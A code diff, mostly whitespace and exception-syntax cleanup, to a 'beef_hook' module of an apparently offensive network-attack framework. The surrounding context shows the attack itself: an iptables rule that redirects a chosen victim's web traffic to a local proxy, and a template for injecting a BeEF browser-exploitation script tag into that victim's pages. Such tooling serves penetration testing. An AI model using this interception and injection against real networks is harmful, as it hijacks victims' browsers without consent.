@@ -15,18 +15,18 @@ class beef_hook(Attack):
         self.hooker       = None
         self.hook_script  = "<script src=\"{0}\"></script>"
         self.iptable_http = "iptables -t nat -A PREROUTING -p tcp --dport 80 -s {0} -j REDIRECT --to-port 5544"
-        self.config.update({"hook_path":Zoption(type = "str", 
-                                          value = None, 
-                                          required = True, 
+        self.config.update({"hook_path":Zoption(type = "str",
+                                          value = None,
+                                          required = True,
                                           display = "Path to BeEF hook"),
-                            "hooked_host": Zoption(type = "ip", 
+                            "hooked_host": Zoption(type = "ip",
                                             value = None,
-                                            required = True, 
+                                            required = True,
                                             display = "Host to hook")
                             })
         self.info = """
                     BeEF (Browser Exploitation Framework) is a tool used in
-                    the exploitation of browsers.  This module serves as a 
+                    the exploitation of browsers.  This module serves as a
                     way to hook any browser without the need for an XSS
                     or other malicious client-facing vector.  Instead,
                     when an attacker is local to a victim, this module
@@ -90,7 +90,7 @@ class Hooker(controller.Master):
     def run(self):
         try:
             return controller.Master.run(self)
-        except Exception, e:
+        except:
             self.shutdown()
 
     def handle_response(self, msg):
